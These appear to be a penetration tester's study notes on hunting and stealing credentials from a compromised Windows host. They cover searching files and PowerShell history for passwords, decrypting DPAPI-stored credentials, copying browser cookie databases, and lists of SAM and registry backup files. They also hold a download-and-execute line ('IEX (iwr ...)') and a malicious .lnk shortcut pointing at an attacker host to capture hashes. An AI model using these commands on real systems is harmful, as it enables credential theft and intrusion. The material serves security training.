# Windows Credential Hunting

### Application Configuration Files

```powershell-session
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

### Dictionary Files

**Chrome Dictionary Files**

```powershell-session
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

### Unattended Installation Files

* Unattended installation files may define auto-logon settings or additional accounts to be created as part of the installation.
* Passwords in the `unattend.xml` are stored in plaintext or base64 encoded.

```xml
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="specialize">
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <AutoLogon>
                <Password>
                    <Value>local_4dmin_p@ss</Value>
                    <PlainText>true</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <LogonCount>2</LogonCount>
                <Username>Administrator</Username>
            </AutoLogon>
            <ComputerName>*</ComputerName>
        </component>
    </settings>
```

* Although these files should be automatically deleted as part of the installation, sysadmins may have created copies of the file in other folders during the development of the image and answer file.

### PowerShell History File

```
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**Confirming PowerShell History Save Path**

```powershell-session
(Get-PSReadLineOption).HistorySavePath
```

**Reading PowerShell History File**

```powershell-session
gc (Get-PSReadLineOption).HistorySavePath
```

```powershell-session
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

* We can also use this one-liner to retrieve the contents of all Powershell history files that we can access as our current user.

### PowerShell Credentials

* PowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently.
* The credentials are protected using [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API), which typically means they can only be decrypted by the same user on the same computer they were created on.
* Take, for example, the following script `Connect-VC.ps1`, which a sysadmin has created to connect to a vCenter server easily.

```powershell
# Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword
```

**Decrypting PowerShell Credentials**

* If we have gained command execution in the context of this user or can abuse DPAPI, then we can recover the cleartext credentials from `encrypted.xml`.
  * The example below assumes the former.

```powershell-session
 $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
```

```powershell-session
$credential.GetNetworkCredential().username
```

```powershell-session
$credential.GetNetworkCredential().password
```

### Manually Searching the File System for Credentials

```cmd-session
findstr /spin "password" *.*
```

**Search File Contents with PowerShell**

```powershell-session
select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
```

**Search for File Extensions - Example 1**

```cmd-session
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
```

**Search for File Extensions - Example 2**

```cmd-session
where /R C:\ *.config
```

**Search for File Extensions Using PowerShell**

```powershell-session
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

### Sticky Notes Passwords

* located here

```
C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```

* We can copy the three `plum.sqlite*` files down to our system and open them with a tool such as [DB Browser for SQLite](https://sqlitebrowser.org/dl/) and view the `Text` column in the `Note` table with the query `select Text from Note;`.

![Pasted image 20240807175846.png](app://85fd2e08a2e02ee3466d9fd1853849432a14/E:/NATHANIEL%20DATA/Personal/OneDrive/obsidian/Alex/Alex/09-Attachments/Pasted%20image%2020240807175846.png?1723033726344)

**Viewing Sticky Notes Data Using PowerShell**

```powershell-session
Set-ExecutionPolicy Bypass -Scope Process
```

```powershell-session
Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
```

```powershell-session
cd .\PSSQLite\
```

```powershell-session
Import-Module .\PSSQLite.psd1
```

```powershell-session
$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
```

```powershell-session
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```

**Strings to View DB File Contents**

* We can also copy them over to our attack box and search through the data using the `strings` command, which may be less efficient depending on the size of the database.

### Other Files of Interest

**Other Interesting Files**

* Some other files we may find credentials in include the following:
*

```shell-session
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```



### Further Credential Theft

#### Cmdkey Saved Credentials

[cmdkey-saved-credentials.md](cmdkey-saved-credentials.md "mention")



### Browser Credentials

**Retrieving Saved Credentials from Chrome**

[retrieving-saved-credentials-from-chrome-windows.md](retrieving-saved-credentials-from-chrome-windows.md "mention")



#### Copy Firefox Cookies Database

```powershell-session
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

* We can copy the file to our machine and use the Python script [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) to extract cookies from the Firefox cookies.SQLite database.

```shell-session
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
```

### Password Managers

**Extracting KeePass Hash**

[extracting-keepass-hash.md](extracting-keepass-hash.md "mention")

**Cracking Hash Offline**

[online-hash-crackers.md](online-hash-crackers.md "mention")

[hashcat.md](hashcat.md "mention")



### Email

* If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox,
  * we can attempt to search the user's email for terms such as "pass," "creds," "credentials," etc. using the tool [MailSniper](https://github.com/dafthack/MailSniper).

### When all else fails

* &#x20;run the [laZagne](app://obsidian.md/laZagne) tool in an attempt to retrieve credentials from a wide variety of software
* [SessionGopher](app://obsidian.md/SessionGopher)



### Wifi Passwords

[extracting-windows-wifi-password.md](extracting-windows-wifi-password.md "mention")



### Citrix Breakout

* [Citrix Breakout](app://obsidian.md/Citrix%20Breakout)

### Traffic Capture

* if wireshark or tcpdump is there you can use it to capture packets from another user

### Monitoring for Process Command Lines

* It captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.
* procmon.ps1

```shell-session
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```

```powershell-session
 IEX (iwr 'http://10.10.10.205/procmon.ps1') 
```

### Search Windows Registry for key

```
# Download script
curl https://raw.githubusercontent.com/KurtDeGreeff/PlayPowershell/master/Search-Registry.ps1 -OutFile Search-Registry.ps1

# View docs
Get-Help .\Search-Registry.ps1

# Simple example (search HKEY_CURRENT_USER for values with data containing "powershell")
.\Search-Registry -StartKey HKCU -Pattern "PowerShell" -MatchData
```

**Get Installed Programs via PowerShell & Registry Keys**

```powershell-session
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```

### Capturing Hashes with a Malicious .lnk File

* Using SCFs no longer works on Server 2019 hosts,
  * but we can achieve the same effect using a malicious [.lnk](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943) file.
* We can use various tools to generate a malicious .lnk file, such as [Lnkbomb](https://github.com/dievus/lnkbomb), as it is not as straightforward as creating a malicious .scf file.
  * We can also make one using a few lines of PowerShell:

**Generating a Malicious .lnk File**

```powershell-session
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```



### Pillaging

* Pillaging is the process of obtaining information from a compromised system.
* It can be personal information, corporate blueprints, credit card data, server information, infrastructure and network details, passwords, or other types of credentials, and anything relevant to the company or security assessment we are working on.
* Below are some of the sources from which we can obtain information from compromised systems:
  * Installed applications
  * Installed services
    * Websites
    * File Shares
    * Databases
    * Directory Services (such as Active Directory, Azure AD, etc.)
    * Name Servers
    * Deployment Services
    * Certificate Authority
    * Source Code Management Server
    * Virtualization
    * Messaging
    * Monitoring and Logging Systems
    * Backups
  * Sensitive Data
    * Keylogging
    * Screen Capture
    * Network Traffic Capture
    * Previous Audit reports
  * User Information
    * History files, interesting documents (.doc/x,.xls/x,password._/pass._, etc)
    * Roles and Privileges
    * Web Browsers
    * IM Clients

#### Extracting Clipboard data

[extracting-clipboard-data-windows.md](extracting-clipboard-data-windows.md "mention")



### &#x20;Search entire windows for a file

* cd to the directory you want to search in

```
 dir /s *confCons.xml* 
```

<br>

